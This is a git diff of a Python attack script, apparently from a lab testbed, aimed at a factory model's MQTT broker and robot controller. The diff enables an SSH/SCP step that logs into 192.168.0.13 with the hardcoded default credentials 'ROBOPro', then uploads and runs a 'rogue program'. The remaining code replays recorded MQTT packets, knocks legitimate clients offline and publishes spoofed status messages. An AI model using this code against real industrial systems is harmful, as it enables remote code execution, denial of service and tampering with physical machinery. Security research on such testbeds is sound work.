@@ -12,13 +12,20 @@ from paramiko.client import AutoAddPolicy
 from scp import SCPClient
 import random
 
-asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
+# # change event loop policy given a Windows machine. ref: https://sbtinstruments.github.io/aiomqtt/index.html#note-for-windows-users
+# asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
 logger = logging.getLogger("attack_order")
-logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
+logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.DEBUG)
+
+# suppress needless logging info from imported modules
+logging.getLogger("paramiko").setLevel(logging.WARNING)
+logging.getLogger("asyncio").setLevel(logging.WARNING)
 
 IP_ADDRESS = '192.168.0.10'
 PORT = 1883
+
 
 def state(active, code, description="", station="vgr", target=None):
     if target is None:
@@ -40,11 +47,12 @@ def new_ts():
 
 
 def retrieve_from_stock(color: str, stock: str) -> str:
-    # stock = stock.decode("utf-8")
-
     stock = json.loads(stock)
 
-    for item in reversed(stock['stockItems']):
+    desired_order = ["C1", "B1", "A1", "C2", "B2", "A2", "C3", "B3", "A3"]
+    ordered_stock_items = sorted(stock["stockItems"], key=lambda x: desired_order.index(x["location"]))
+
+    for item in ordered_stock_items:
         if item['workpiece'] and item['workpiece']['type'] == color:
             globs.wp_location = item['location']
             globs.wp_id = item['workpiece']['id']
@@ -81,29 +89,29 @@ async def ssh_attack():
     logging.getLogger("paramiko").setLevel(logging.WARNING)
 
     logger.info("Starting file upload attack on target VGR")
-    # server = '192.168.0.13'
-    # port = 22
-    # username = password = 'ROBOPro'
-    #
-    # # create ssh object and connect
-    # ssh = SSHClient()
-    # ssh.load_host_keys('/home/kali/.ssh/known_hosts')
-    # ssh.set_missing_host_key_policy(AutoAddPolicy)
-    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
-    #
-    # # hijack the established tcp/ssh connection and copy files
-    # scp = SCPClient(ssh.get_transport())
-    # path = '/home/kali/fischer/vgr/C-Program/'
-    # # now copy the rogue program
-    # scp.put(f'{path}TxtParkPosVGR', '.')
-    # path2 = '/home/kali/fischer/vgr/Data/Config.ParkPos.json'
-    # scp.put(f'{path2}', 'Data/')
-    #
-    # # now run the rogue program
-    # ssh.exec_command('./TxtParkPosVGR')
-    # time.sleep(2)
-    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
-    # ssh.exec_command('./TxtParkPosVGR')
+    server = '192.168.0.13'
+    port = 22
+    username = password = 'ROBOPro'
+
+    # create ssh object and connect
+    ssh = SSHClient()
+    ssh.load_host_keys('/home/kali/.ssh/known_hosts')
+    ssh.set_missing_host_key_policy(AutoAddPolicy)
+    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+
+    # hijack the established tcp/ssh connection and copy files
+    scp = SCPClient(ssh.get_transport())
+    path = '/home/kali/fischer/vgr/C-Program/'
+    # now copy the rogue program
+    scp.put(f'{path}TxtParkPosVGR', '.')
+    path2 = '/home/kali/fischer/vgr/Data/Config.ParkPos.json'
+    scp.put(f'{path2}', 'Data/')
+
+    # now run the rogue program
+    ssh.exec_command('./TxtParkPosVGR')
+    time.sleep(2)
+    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+    ssh.exec_command('./TxtParkPosVGR')
     logging.info("Connected via SCP/SSH. Attack program uploaded and executed on target VGR.")
 
 
@@ -129,9 +137,7 @@ async def publish_state_10_seconds(client):
 
             await asyncio.sleep(10)
         else:
-            print("First")
-            await asyncio.sleep(5)
-            print("Second")
+            await asyncio.sleep(2)
 
 async def mass_publish(client, db_packets):
     # now we begin replaying our stored packets, but first ....
@@ -154,8 +160,9 @@ async def mass_publish(client, db_packets):
 
         # now be with publishing, before each publish, we wait for time_delta_previous from our db
         # we send out packets 0.15 seconds earlier to cover for network I/O delay
-        if float(wait_time) >= 0.15:
-            await asyncio.sleep(float(wait_time)-0.15)
+        # alternatively, we can just send throughout with qos 0 and get reach of the if condition
+        if float(wait_time) >= 0.1:
+            await asyncio.sleep(float(wait_time)-0.1)
         await client.publish(mqtt_topic, mqtt_payload, qos=int(mqtt_qos))
 
     logger.info("Waiting for attack to finish, almost there")
@@ -164,9 +171,6 @@ async def mass_publish(client, db_packets):
 async def main():
 
     async with aiomqtt.Client(IP_ADDRESS, port=PORT) as client:
-        print(client._client.max_inflight_messages)
-        print(client._client.max_queued_messages)
-
         # start a coroutine that runs concurrently our logic to publish FL state information every 10 seconds
         asyncio.create_task(publish_state_10_seconds(client))
 
@@ -177,12 +181,12 @@ async def main():
 
         async for message in client.messages:
             try: mqtt_payload = json.loads(message.payload)
-            except json.decoder.JSONDecodeError as error: logger.debug(f"{error}\n{message.topic}\n{message.payload}")
+            except json.decoder.JSONDecodeError as error: pass # logger.debug(f"{error}\n{message.topic}\n{message.payload}")
 
             if message.topic.matches("f/i/stock") and not globs.is_stock_recorded:
                 globs.HBW_STOCK = message.payload
                 globs.is_stock_recorded = True
-                print("Stock recorded")
+                logger.debug("Stock recorded")
 
                 await dos_leg_clients(client)
                 logger.info("Broadcast attack done. Legitimate clients now shut down")
@@ -218,6 +222,6 @@ async def main():
                     "First run of attack done. Now sending idle status information to user while listening for new order.")
                 globs.send_state_every_10_seconds_trigger = True
                 globs.is_stock_recorded = False
-                print("Done")
+                logger.debug("Done")
 
 asyncio.run(main())
